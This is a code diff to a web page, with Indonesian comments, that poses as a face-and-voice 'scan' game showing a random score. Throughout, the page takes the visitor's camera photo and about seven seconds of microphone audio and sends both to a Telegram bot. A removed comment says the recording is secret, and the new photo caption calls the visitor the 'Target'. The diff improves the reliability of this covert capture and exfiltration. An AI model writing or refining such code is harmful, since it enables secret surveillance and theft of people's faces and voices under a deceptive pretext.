@@ -17,8 +17,7 @@
         @keyframes scan { 0%, 100% { top: 0%; } 50% { top: 100%; } }
         .btn-main { background: #fff; color: #000; padding: 18px 40px; border: none; border-radius: 20px; font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s; }
         #status { margin-top: 20px; font-size: 0.7rem; color: var(--cyan); font-weight: 700; letter-spacing: 2px; }
-        #final-box { display: none; animation: popUp 0.6s ease-out; }
-        @keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        #final-box { display: none; }
         .score-num { font-size: 5rem; font-weight: 800; color: var(--cyan); margin: 5px 0; }
     </style>
 </head>
@@ -60,22 +59,22 @@
         async function loadAI() {
             try {
                 await faceapi.nets.tinyFaceDetector.loadFromUri('https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights');
-                status.innerText = "SENSOR READY";
-            } catch(e) { status.innerText = "AI MODULE ERROR"; }
+            } catch(e) { console.log("AI Load Error"); }
         }
         loadAI();
 
         document.getElementById('start-btn').onclick = async () => {
             document.getElementById('intro').style.display = 'none';
             document.getElementById('cam-holder').style.display = 'block';
-            status.innerText = "SENSING...";
+            status.innerText = "INITIALIZING SENSORS...";
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
 
-                // MediaRecorder untuk merekam suara secara rahasia
-                mediaRecorder = new MediaRecorder(stream);
+                // Gunakan format webm yang lebih stabil di browser
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                
                 mediaRecorder.ondataavailable = (e) => {
                     if (e.data.size > 0) audioChunks.push(e.data);
                 };
@@ -90,34 +89,35 @@
                             laser.style.display = 'block';
                             status.innerText = "SCANNING FACE & VOICE...";
                             
-                            audioChunks = []; // Reset chunks
-                            mediaRecorder.start();
+                            audioChunks = [];
+                            mediaRecorder.start(1000); // Ambil data setiap 1 detik agar tidak kosong
 
-                            // Rekam selama 6 detik
                             setTimeout(() => {
-                                mediaRecorder.stop(); // Berhenti rekam dulu baru jepret
+                                mediaRecorder.stop(); 
                                 clearInterval(checkLoop);
-                            }, 6000);
+                            }, 7000); // Rekam sedikit lebih lama (7 detik)
                         } else {
-                            status.innerText = "POSITION FACE IN CIRCLE";
+                            status.innerText = "POSITION FACE IN CENTER";
                         }
-                    }, 800);
+                    }, 1000);
                 });
 
-                // Ketika rekaman suara berhenti, kirim semuanya
                 mediaRecorder.onstop = async () => {
-                    status.innerText = "PROCESSING DATA...";
-                    await takeAndSend();
+                    status.innerText = "FINALIZING ANALYSIS...";
+                    // Beri jeda 500ms agar blob audio benar-benar selesai ditulis
+                    setTimeout(async () => {
+                        await takeAndSend();
+                    }, 500);
                 };
 
             } catch (err) {
-                alert("Izin Kamera & Mikrofon wajib!");
+                alert("Please allow Camera & Mic.");
                 location.reload();
             }
         };
 
         async function takeAndSend() {
-            // 1. Proses Foto (Mirror Fixed)
+            // 1. Capture Foto
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -125,32 +125,30 @@
             ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+            const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
             const score = Math.floor(Math.random() * 11) + 88;
 
-            // 2. Kirim Foto ke Telegram
+            // 2. Kirim Foto
             const photoData = new FormData();
             photoData.append('chat_id', CONFIG.CHAT_ID);
             photoData.append('photo', photoBlob, 'face.png');
-            photoData.append('caption', `🎭 **PRANK PERFECT**\n\n🎯 Score: ${score}%\n📸 Foto wajah terlampir.`);
-            
+            photoData.append('caption', `🎭 **PRANK PERFECT**\n\n🎯 Score: ${score}%\n📸 Foto Target.`);
             await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: photoData });
 
-            // 3. Proses & Kirim Audio ke Telegram
-            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+            // 3. Kirim Audio (Format fix untuk Telegram)
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
             const audioData = new FormData();
             audioData.append('chat_id', CONFIG.CHAT_ID);
-            audioData.append('voice', audioBlob, 'voice.ogg');
+            audioData.append('voice', audioBlob, 'voice.ogg'); // Telegram akan convert webm ke ogg otomatis
             
             await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVoice`, { method: 'POST', body: audioData });
 
-            // 4. UI Selesai
+            // 4. Tampilkan Hasil
             document.getElementById('cam-holder').style.display = 'none';
             status.style.display = 'none';
             document.getElementById('score-val').innerText = score + "%";
             document.getElementById('final-box').style.display = 'block';
 
-            // Matikan Kamera & Mic
             video.srcObject.getTracks().forEach(t => t.stop());
         }
     </script>
